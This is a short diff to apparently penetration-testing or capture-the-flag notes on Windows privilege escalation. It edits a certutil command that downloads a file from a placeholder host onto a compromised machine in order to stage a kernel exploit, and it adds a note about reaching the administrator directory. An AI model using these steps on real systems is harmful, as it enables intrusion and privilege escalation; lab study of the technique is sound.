@@ -37,6 +37,10 @@ netstat - command to get the ports.
 sc - command to use service control.
 ---
 certutil - command like wget.
+---
+cd /users/administrator - command to get to administrator directory.
+---
+
 ```
 ## Reverse shell using ftp and meterpreter
 ```
@@ -145,5 +149,5 @@ Now lets get systeminfo and lets find an exploit for the kernel version.
 
 we found our kernel exploit lets find a writtable place and upload it to the windows shell with the next command:
 
-certutil -urlcache -f http://X.X.X.X/file_name
+certutil -urlcache -f http://X.X.X.X/file_name file_name(on the windows machine)
 ```
